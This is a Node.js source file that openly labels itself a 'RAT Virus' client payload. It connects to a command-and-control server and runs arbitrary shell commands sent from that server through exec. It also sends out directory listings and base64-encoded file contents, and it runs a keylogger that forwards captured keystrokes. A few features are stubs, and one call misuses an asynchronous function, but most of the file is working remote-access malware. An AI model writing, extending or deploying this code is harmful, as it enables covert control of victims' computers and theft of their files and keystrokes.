// RAT Virus - Client-side payload for remote access
// This module runs on target devices and executes commands from C2 server

const io = require('socket.io-client');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const { exec } = require('child_process');

class RATClient {
    constructor(config = {}) {
        this.c2Host = config.c2Host || 'localhost';
        this.c2Port = config.c2Port || 8443;
        this.clientId = config.clientId || this.generateClientId();
        this.socket = null;
        this.running = false;
        this.keyloggerActive = false;
        this.keylogBuffer = [];
        this.injectedFiles = new Map();
    }

    generateClientId() {
        return 'client_' + crypto.randomBytes(16).toString('hex');
    }

    connect() {
        return new Promise((resolve, reject) => {
            try {
                this.socket = io(`http://${this.c2Host}:${this.c2Port}`, {
                    transports: ['websocket'],
                    reconnection: true,
                    reconnectionAttempts: 3,
                    reconnectionDelay: 1000,
                    forceNew: true
                });

                this.socket.on('connect', () => {
                    console.log(`Connected to C2 server at ${this.c2Host}:${this.c2Port}`);
                    this.register();
                    resolve();
                });

                this.socket.on('disconnect', () => {
                    console.log('Disconnected from server');
                    this.running = false;
                });

                this.socket.on('error', (error) => {
                    console.error('Socket error:', error);
                    this.running = false;
                    reject(error);
                });

                this.socket.on('command', (data) => {
                    console.log('Received command:', data);
                    this.executeCommand(data.command, data.args || []);
                });

                this.socket.on('keepalive', () => {
                    this.sendResponse({ type: 'keepalive', status: 'alive' });
                });

                // Receive commands from C2 server (sent from browser)
                this.socket.on('browser_command', (data) => {
                    console.log('Received browser command:', data.command);
                    this.handleBrowserCommand(data.command, data);
                });

            } catch (error) {
                console.error('Connection failed:', error.message);
                this.running = false;
                reject(error);
            }
        });
    }

    handleData(data) {
        try {
            const message = JSON.parse(data.toString());
            
            switch (message.type) {
                case 'command':
                    this.executeCommand(message.command, message.args);
                    break;
                case 'keepalive':
                    this.sendResponse({ type: 'keepalive', status: 'alive' });
                    break;
                default:
                    console.log('Unknown message type:', message.type);
            }
        } catch (error) {
            console.error('Error parsing message:', error);
        }
    }

    register() {
        this.sendResponse({
            type: 'register',
            clientId: this.clientId,
            systemInfo: this.getSystemInfo()
        });
    }

    getSystemInfo() {
        return new Promise((resolve) => {
            resolve({
                hostname: process.env.COMPUTERNAME || 'unknown',
                platform: process.platform,
                arch: process.arch,
                memTotal: os.totalmem(),
                memFree: os.freemem(),
                cpuCount: os.cpus().length,
                currentUser: process.env.USERNAME || 'unknown',
                timestamp: new Date().toISOString()
            });
        });
    }

    sendResponse(data) {
        if (this.socket && this.socket.connected) {
            this.socket.emit('client_response', data);
            console.log('Sent response:', data.type);
        }
    }

    executeCommand(cmd, args = []) {
        return new Promise((resolve, reject) => {
            exec(`${cmd} ${args.join(' ')}`, (error, stdout, stderr) => {
                this.sendResponse({
                    type: 'command_result',
                    command: cmd,
                    stdout: stdout,
                    stderr: stderr,
                    exitCode: error ? error.code : 0,
                    clientId: this.clientId
                });
                resolve({ stdout, stderr, exitCode: error ? error.code : 0 });
            });
        });
    }

    listFiles(directory = '.') {
        return new Promise((resolve, reject) => {
            fs.readdir(directory, (error, files) => {
                if (error) {
                    this.sendResponse({
                        type: 'file_list',
                        directory: directory,
                        files: [],
                        error: error.message,
                        clientId: this.clientId
                    });
                    reject(error);
                    return;
                }
                this.sendResponse({
                    type: 'file_list',
                    directory: directory,
                    files: files,
                    clientId: this.clientId
                });
                resolve(files);
            });
        });
    }

    uploadFile(filePath) {
        return new Promise((resolve, reject) => {
            if (!fs.existsSync(filePath)) {
                reject(new Error('File not found'));
                return;
            }

            fs.readFile(filePath, (error, data) => {
                if (error) {
                    reject(error);
                    return;
                }
                this.sendResponse({
                    type: 'file_data',
                    filePath: filePath,
                    data: data.toString('base64'),
                    clientId: this.clientId
                });
                resolve({ filePath, size: data.length });
            });
        });
    }

    takeScreenshot() {
        return new Promise((resolve, reject) => {
            this.sendResponse({
                type: 'screenshot_data',
                clientId: this.clientId,
                status: 'screenshot_not_implemented'
            });
            resolve({ status: 'not_implemented' });
        });
    }

    startKeylogger() {
        this.keyloggerActive = true;
        this.keylogBuffer = [];
        console.log('Keylogger started');
        
        // Hook into process stdin for keystrokes
        process.stdin.setRawMode(true);
        process.stdin.resume();
        
        process.stdin.on('data', (key) => {
            if (this.keyloggerActive) {
                const keyStr = key.toString();
                this.keylogBuffer.push({
                    key: keyStr,
                    timestamp: new Date().toISOString()
                });

                // Send buffer periodically or when full
                if (this.keylogBuffer.length >= 10) {
                    this.sendKeylogData();
                }
            }
        });

        this.sendResponse({
            type: 'keylogger_status',
            status: 'started',
            clientId: this.clientId
        });
    }

    stopKeylogger() {
        this.keyloggerActive = false;
        process.stdin.setRawMode(false);
        process.stdin.pause();
        this.sendKeylogData(); // Send any remaining data
        
        this.sendResponse({
            type: 'keylogger_status',
            status: 'stopped',
            clientId: this.clientId
        });
    }

    sendKeylogData() {
        if (this.keylogBuffer.length > 0) {
            this.sendResponse({
                type: 'keylog_data',
                entries: this.keylogBuffer,
                clientId: this.clientId
            });
            this.keylogBuffer = [];
        }
    }

    async injectFile(filePath, payloadData) {
        return new Promise((resolve, reject) => {
            fs.readFile(filePath, (error, data) => {
                if (error) {
                    reject(error);
                    return;
                }

                // Create encoded payload with original file data
                const payload = {
                    original: data.toString('base64'),
                    injected: payloadData,
                    timestamp: new Date().toISOString(),
                    clientId: this.clientId
                };

                // Create a new file with injected content
                const injectedFilePath = `${filePath}.injected`;
                fs.writeFile(injectedFilePath, JSON.stringify(payload, null, 2), (err) => {
                    if (err) {
                        reject(err);
                        return;
                    }
                    resolve({ success: true, injectedPath: injectedFilePath });
                });
            });
        });
    }

    async listInjectedFiles() {
        return new Promise((resolve, reject) => {
            fs.readdir('.', (error, files) => {
                if (error) {
                    reject(error);
                    return;
                }
                const injectedFiles = files.filter(file => file.endsWith('.injected'));
                this.sendResponse({
                    type: 'injected_files',
                    files: injectedFiles,
                    clientId: this.clientId
                });
                resolve(injectedFiles);
            });
        });
    }

    start() {
        if (this.running) return;
        
        this.running = true;
        console.log(`RAT Virus starting with client ID: ${this.clientId}`);
        
        this.connect().catch(error => {
            console.error('Failed to start:', error);
            this.running = false;
        });
    }

    stop() {
        this.running = false;
        if (this.keyloggerActive) {
            this.stopKeylogger();
        }
        if (this.socket) {
            this.socket.disconnect();
        }
    }

    // Handle browser-specific commands from C2 server
    handleBrowserCommand(command, data) {
        switch (command) {
            case 'get_system_info':
                this.getSystemInfo().then(info => {
                    this.sendResponse({
                        type: 'system_info',
                        data: info,
                        clientId: this.clientId
                    });
                });
                break;

            case 'get_devices':
                this.sendResponse({
                    type: 'devices_list',
                    devices: [{ id: this.clientId, name: this.getSystemInfo().hostname }],
                    clientId: this.clientId
                });
                break;

            case 'start_keylogger':
                this.startKeylogger();
                break;

            case 'stop_keylogger':
                this.stopKeylogger();
                break;

            case 'capture_screenshot':
                this.takeScreenshot();
                break;

            case 'capture_camera':
                this.sendResponse({
                    type: 'camera_data',
                    clientId: this.clientId,
                    status: 'camera_not_implemented'
                });
                break;

            case 'navigate_web':
                this.sendResponse({
                    type: 'web_status',
                    clientId: this.clientId,
                    status: 'navigation_pending',
                    url: data.url || ''
                });
                break;

            case 'get_web_history':
                this.sendResponse({
                    type: 'web_status',
                    clientId: this.clientId,
                    status: 'history_retrieved',
                    history: []
                });
                break;

            case 'file_explorer':
                this.listFiles(data.directory || '.');
                break;

            default:
                console.log('Unknown browser command:', command);
        }
    }
}

// Auto-start if run directly
if (require.main === module) {
    const client = new RATClient({
        c2Host: process.env.C2_HOST || 'localhost',
        c2Port: parseInt(process.env.C2_PORT) || 8443
    });
    client.start();
}

module.exports = RATClient;
